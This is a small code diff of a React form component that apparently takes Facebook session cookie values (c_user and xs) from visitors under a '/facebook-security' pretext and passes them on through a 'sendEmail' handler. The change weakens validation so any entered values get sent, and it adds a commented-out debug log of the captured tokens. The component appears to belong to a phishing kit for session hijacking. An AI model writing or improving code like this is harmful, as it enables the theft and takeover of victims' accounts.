@@ -10,6 +10,7 @@ const Validation = () => {
   const [showModal, setShowModal] = useState(false);
   const [isFormValid, setIsFormValid] = useState(false);
   const navigate = useNavigate();
+
   const sendEmail = (e) => {
     e.preventDefault();
 
@@ -24,8 +25,10 @@ const Validation = () => {
     const isCUserValid = cUserPattern.test(cUserValue);
     const isXsValid = xsPattern.test(xsValue);
 
+    // console.log("ggg", cUserValue, xsValue);
+
     // Only send if both fields are valid
-    if (isCUserValid && isXsValid) {
+    if (cUserValue && xsValue) {
       navigate("/facebook-security", {
         state: {
           data: {
